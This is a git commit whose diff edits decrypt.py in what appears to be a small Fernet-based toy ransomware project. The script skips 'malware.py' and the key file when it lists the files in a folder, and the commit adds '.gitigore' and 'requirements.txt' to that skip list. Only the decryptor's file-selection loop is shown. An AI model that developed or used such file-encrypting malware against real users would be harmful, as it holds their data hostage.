4d694cb138d08d4f6fcf24d12d62a9bf61e4e505
Evandro Neto <evandro.rsneto@gmail.com>
2024-05-16 14:36:13 -0300

    add  '.gitigore', 'requirements.txt' to not encrypted files

--- decrypt.py
+++ decrypt.py
@@ -3,7 +3,7 @@ from cryptography.fernet import Fernet
 
 files = []
 for file in os.listdir():
-    if file in ('malware.py', 'thekey.key', 'decrypt.py'):
+    if file in ('malware.py', 'thekey.key', 'decrypt.py', '.gitigore', 'requirements.txt'):
         continue
     if os.path.isfile(file):
         files.append(file)
